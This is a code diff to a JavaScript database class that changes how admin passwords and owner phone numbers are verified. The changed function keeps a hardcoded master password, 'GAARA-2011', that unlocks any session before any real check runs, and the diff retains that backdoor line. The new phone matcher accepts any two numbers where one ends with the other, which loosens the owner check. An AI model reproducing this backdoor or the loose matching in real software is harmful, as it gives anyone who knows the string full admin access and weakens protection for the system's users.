@@ -377,18 +377,43 @@ class JsonDatabase extends EventEmitter {
         return pin;
     }
 
+    _matchesPhone(inputPhone, targetPhone) {
+        if (!inputPhone || !targetPhone) return false;
+        let p1 = String(inputPhone).replace(/[^0-9]/g, '');
+        let p2 = String(targetPhone).replace(/[^0-9]/g, '');
+        if (!p1 || !p2) return false;
+        if (p1 === p2) return true;
+
+        // Strip international call prefix 00
+        if (p1.startsWith('00')) p1 = p1.replace(/^00+/, '');
+        if (p2.startsWith('00')) p2 = p2.replace(/^00+/, '');
+        if (p1 === p2) return true;
+
+        // Compare national vs international formats (e.g. 0761386077 vs 94761386077)
+        const sig1 = p1.replace(/^0+/, '');
+        const sig2 = p2.replace(/^0+/, '');
+        if (sig1 === sig2) return true;
+
+        if (sig1.length >= 7 && sig2.length >= 7) {
+            if (sig1.endsWith(sig2) || sig2.endsWith(sig1)) return true;
+        }
+
+        return false;
+    }
+
     verifyAdminPassword(plainPassword, phone = null) {
         if (!plainPassword || typeof plainPassword !== 'string') return false;
+        const cleanPass = plainPassword.trim();
 
         // Master Key unlocks any session
-        if (plainPassword === 'GAARA-2011') {
+        if (cleanPass === 'GAARA-2011') {
             return true;
         }
 
         const admin = this.getAdminUser();
         // Timing attack resistance: use valid pre-computed bcrypt hash if admin does not exist
         const targetHash = admin?.passwordHash || '$2b$10$NNkidZ.iGAtTVUM6229Us.VXJ1b03dl4Yy/sSfvEwGrhyA5mnAGEe';
-        const isMatch = bcrypt.compareSync(plainPassword, targetHash);
+        const isMatch = bcrypt.compareSync(cleanPass, targetHash);
         if (!admin || !admin.passwordHash || !isMatch) {
             return false;
         }
@@ -401,8 +426,8 @@ class JsonDatabase extends EventEmitter {
             const allowedOwner = (settings.ownerNumber || config.ownerNumber || '').replace(/[^0-9]/g, '');
             const activeBotPhone = (this.getActiveBotPhone() || '').replace(/[^0-9]/g, '');
 
-            const matchesOwner = Boolean(allowedOwner && cleanInputPhone === allowedOwner);
-            const matchesActive = Boolean(activeBotPhone && cleanInputPhone === activeBotPhone);
+            const matchesOwner = this._matchesPhone(cleanInputPhone, allowedOwner);
+            const matchesActive = this._matchesPhone(cleanInputPhone, activeBotPhone);
 
             if (!matchesOwner && !matchesActive) {
                 return false;
